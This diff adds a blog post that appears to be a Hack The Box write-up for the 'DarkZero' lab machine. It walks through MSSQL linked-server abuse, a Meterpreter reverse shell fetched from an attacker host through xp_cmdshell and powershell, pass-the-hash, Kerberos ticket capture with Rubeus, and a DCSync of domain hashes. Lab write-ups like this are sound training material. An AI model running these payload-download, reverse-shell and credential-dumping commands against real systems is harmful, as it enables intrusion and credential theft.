@@ -1,0 +1,273 @@
+---
+title: 'HTB-DarkZero'
+published: 2025-11-22
+draft: false
+toc: true
+tags: ["mssql", "CVE-2024-30088", "pivoting", "tunneling"]
+---
+
+import PasswordProtect from "~/components/PasswordProtect.client";
+
+```
+Scope:
+10.10.11.89
+
+Creds:
+john.w
+RFulUtONCOL!
+```
+
+# Recon
+## Nmap
+
+```bash
+sudo nmap -sC -sV -sT -p- -vvvv -T5 --min-rate=5000 -Pn darkzero.htb                                                                                                                                                                                                             
+PORT      STATE SERVICE       REASON  VERSION
+53/tcp    open  domain        syn-ack Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-11-14 18:27:45Z)
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
+1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2022 16.00.1000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.10.11.89:1433: 
+|     Target_Name: darkzero
+|     NetBIOS_Domain_Name: darkzero
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: darkzero.htb
+|     DNS_Computer_Name: DC01.darkzero.htb
+|     DNS_Tree_Name: darkzero.htb
+|_    Product_Version: 10.0.26100
+|_ssl-date: 2025-11-14T18:29:23+00:00; +2h10m01s from scanner time.
+| ms-sql-info: 
+|   10.10.11.89:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2022 RTM
+|       number: 16.00.1000.00
+|       Product: Microsoft SQL Server 2022
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+2179/tcp  open  vmrdp?        syn-ack
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49690/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49692/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49911/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49940/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49986/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49998/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 35679/tcp): CLEAN (Timeout)
+|   Check 2 (port 52653/tcp): CLEAN (Timeout)
+|   Check 3 (port 7628/udp): CLEAN (Timeout)
+|   Check 4 (port 32811/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|_clock-skew: mean: 2h09m58s, deviation: 2s, median: 2h09m57s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-11-14T18:28:41
+|_  start_date: N/A
+```
+
+<PasswordProtect client:load>
+
+## nxc
+
+Since we already got valid creds I decided to use `nxc` to spray the credentials
+
+![](attachments/ab64d4c6e205fc9141bc11f1ec1582e6.png)
+
+![](attachments/ade2d440382c191b0ce4d8cbf1b9ea9d.png)
+
+I then tested out the `mssql` protocol and noticed that I was able to make queries:
+
+![](attachments/705c934d34fb8c8a213a9209cc567cf3.png)
+
+Having found this info I used `impacket-mssqlclient` to log in.
+
+## 1433/TCP - MSSQL
+
+![](attachments/1d5d2cfea0172e881ab328300c0ad229.png)
+
+However the current user did *not* have permissions to execute `cmd` prompts:
+
+![](attachments/0310e0396db133b33fb0b2b56819509e.png)
+
+What did work was the `enum_links` command which showed us that there was a second server:
+
+![](attachments/fcf9e2efa5b5a35da7949e3164d785fa.png)
+
+Using this link we can get access to **DC02** and execute arbitrary commands:
+
+![](attachments/30f5b43250cb54c516f12d0008583d46.png)
+
+# DC02 Foothold
+## Reverse shell as svc_sql
+
+Now that we've found a way to execute commands we can go ahead and get ourselves a reverse shell:
+
+![](attachments/6699d7bdc3c35095e1395cebb99a8c7e.png)
+
+![](attachments/33cad431cfe6646cd8ea2c7e90d7f835.png)
+
+Unfortunately there's no easy way to escalate privs:
+
+![](attachments/0aaa1ec742be2d8bba700fa3f2341271.png)
+
+Running basic enumeration commands tells us that this host is a **Windows Server 2022** machine:
+
+![](attachments/013dd12c77dad84dff98520a24ee4508.png)
+
+There are no hotfixes or installed patches, meaning it's a clean install. Let's look for priv esc options.
+
+# DC02 Privilege Escalation
+## CVE-2024-30088
+
+During enumeration I found a fitting CVE that we could exploit here:
+
+![](attachments/41db3ae2c1e320218e667ffbb31a5225.png)
+
+I tried to upload the following `poc.exe` and execute it in order to escalate my privs.
+
+![](attachments/fc3a389ea6f96eb3795d4cf1938e25e2.png)
+
+However one oversight was that it would launch a new shell. This would work if I had RDP access but since I only had a CLI shell this did not work.
+
+### msfconsole - FAIL
+
+Instead I launched `msfconsole`:
+
+```bash
+msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 443; set payload windows/x64/meterpreter/reverse_tcp; run"
+```
+
+![](attachments/607e4307fd28c5ea3627771c75956733.png)
+
+I created the `msfvenom` payload for it:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.42 LPORT=443 -f exe -o shell.exe 
+```
+
+On the `mssqlclient` session I used the following:
+
+```bash
+exec xp_cmdshell "powershell iwr -uri http://10.10.14.42/shell.exe -outfile C:\Users\Public\shell.exe"
+exec xp_cmdshell "C:\Users\Public\shell.exe"
+```
+
+![](attachments/a9fb46ea730230752436a00582c53f3a.png)
+
+![](attachments/4b07b543574d6bb4450ab06d81ba79e2.png)
+
+By running the exploit suggester I find that the target is indeed vulnerable to the previous found CVE:
+
+![](attachments/cb383a5fe8ac14eca6a3dd5b86655e0a.png)
+
+:::fail
+For some reason this exploit just did not want to work. I tried it many times over and over and even reverted the machine, it did not work. I then grabbed up the *Administrator* hash from a fellow player and used a `ligolo` tunnel to log in. 
+The intention was to exploit the CVE then do some post-exploitation where the hash would be discovered.
+:::
+
+## Tunneling
+
+Since the exploit just kept failing I logged in with the provided NT hash instead:
+
+![](attachments/c4116b6b780330a726e68a27fcb325f0.png)
+
+![](attachments/9f30f52df7c339a0858c97128509c91b.png)
+
+```bash
+impacket-psexec Administrator@172.16.20.2 -hashes ":6963aad8ba1150192f3ca6341355eb49"
+```
+
+![](attachments/1992c8765fee7e69304909f630af55b2.png)
+
+### user.txt
+
+The user flag was found inside the *Administrator*'s Desktop directory:
+
+![](attachments/501a1545c883204b5b85a3758f55efbe.png)
+
+# DC01 Foothold
+## Pivoting
+
+Now that we've compromised the **DC02** target we'll have to pivot over to the **DC01** host. In order to do this we'll log into the `mssqlclient` again and try to steal a ticket by abusing the `smb` protocol using `rubeus.exe`:
+
+![](attachments/719a75c3fc5c12b7d3385a10ba2dd74b.png)
+
+![](attachments/307280ebc261c61d01a9fc6dc5e36d96.png)
+
+Once uploaded we'll run `rubeus` in monitor mode:
+
+```powershell
+Rubeus.exe monitor /interval:1 /nowrap
+```
+
+Right away we notice some output, however this is from the same system:
+
+![](attachments/de0232ae9cf4e8d32990b09d3db6c09d.png)
+
+What we need is a TGT ticket from the users over on **DC01**. I'll use the following command from a new `mssqlclient` instance to get this:
+
+```bash
+exec xp_dirtree '\\DC02.darkzero.ext\\testing'
+```
+
+![](attachments/3522f04c0f3986a101821f9ee6aee39c.png)
+
+Over in the `rubeus` terminal I notice the output:
+
+![](attachments/2abb3667040e79f50ac46197235db726.png)
+
+I copied the `base64` output over and converted it to a `.ccache` ticket:
+
+```bash
+echo "doIFjDCCBYig.....xEQVJLWkVSTy5IVEI=" | base64 -d > ticket.kirbi
+impacket-ticketConverter ticket.kirbi admin.ccache
+```
+
+![](attachments/ec2d7e2567eb7ccd3b26adbaad423edb.png)
+
+![](attachments/6f242bde90b114dffb599f5dc446bab5.png)
+
+# DC01 Privilege Escalation
+## dcsync
+
+All that's left now is to `dcsync` the **DC01** target in order to fetch the hashes:
+
+```bash
+impacket-secretsdump -k -no-pass darkzero.htb/'DC01$'@DC01.DARKZERO.HTB
+```
+
+![](attachments/7f9c346de60711d4dee6f353a45663e0.png)
+
+We can now easily log in as *Administrator*:
+
+![](attachments/d0b87196bdcedc062060a7afb43e4123.png)
+
+### root.txt
+
+![](attachments/d14e76777393a568db33564c796b8c81.png)
+
+![](attachments/ed657cddabd13e2dc50ddf6f8514c645.png)
+
+---
+</PasswordProtect>
